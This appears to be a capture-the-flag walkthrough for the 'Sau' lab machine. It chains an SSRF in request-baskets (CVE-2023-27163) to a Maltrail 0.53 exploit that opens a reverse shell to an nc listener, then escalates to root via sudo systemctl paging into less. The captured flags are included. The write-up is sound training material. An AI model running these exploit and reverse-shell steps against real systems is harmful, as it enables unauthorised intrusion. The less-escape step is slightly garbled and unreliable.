![[Sau.png]]
# Initial Reconnaissance
1. `curl 10.10.11.224 -I` to find possible DNS location, but there's no response
2. visiting the webpages seems to return timeout
3. `nmap -sVC 10.10.11.224` to find any other open port, and there's a port opened at 55555 running an unknown service, visiting the pages shows a `request-baskets 1.2.1`
4. a simple search lead me to an RCE assigned `CVE-2023-27163` and there's a POC available here `https://github.com/entr0pie/CVE-2023-27163`

# User Escalation
1. clone the POC then run the script `sh exploit.sh http://10.10.11.224:55555 http://127.0.0.1:80`, i am creating an SSRF to the localhost in port 80
2. then it will return a link to the basket, which in my case its `http://10.10.11.224:55555/apchog`, visiting the pages shows a webpages running `maltrail v0.53` which has a possible RCE via the `/login`, with assigned ``
3. POC can be found here `https://github.com/spookier/Maltrail-v0.53-Exploit`, clone the repo, before doing anything, create another basket that target to the `127.0.0.1:80/login`, note: the POC is updated by default to be by default to target `/login`, all i need was to specify the `127.0.0.1:80` as the target
4. after obtaining the new url, setup an nc listener because the Maltrail POC is actually a reverse shell `nc -lvnp port`
5. then run the exploit `python3 exploit.py your-ip port http://10.10.11.224:55555/lrcaxk`
6. check the nc listener, should be a `$` spawned, which mean the connection is established, try to do `id` or `pwd` to make sure
7. i logged in as user `puma`, now this is an unstable shell, to secure a robust shell use this python oneliner `python3 -c "import pty; pty.spawn('/bin/bash')"`
8. `cd`, then `cat user.txt`
9. flag: `71774d498b42338de22f1d3f764345f7`

# Further Reconnaissance
1. `sudo -l`, to see any possible sudo command to exploit, seems like i could check the service `trail.service` with `systemctl` as sudo and no password needed

# Privilege Escalation
1. based on this article `https://bugzilla.redhat.com/show_bug.cgi?id=713567` `systemctl` actually returns all of it's output via `less`
2. find the exploit in `https://gtfobins.github.io/gtfobins/less/#sudo`
3. run the allowed command `sudo systemctl status trail.service`
4. then just input `#!/bin/bash` and enter
5. notice i have escalated as root
6. `cat /root/root.txt`
7. flag: `498a0229bb9d4cb391a34f968e0cbe92`

![[Sau-Pwned.png]]
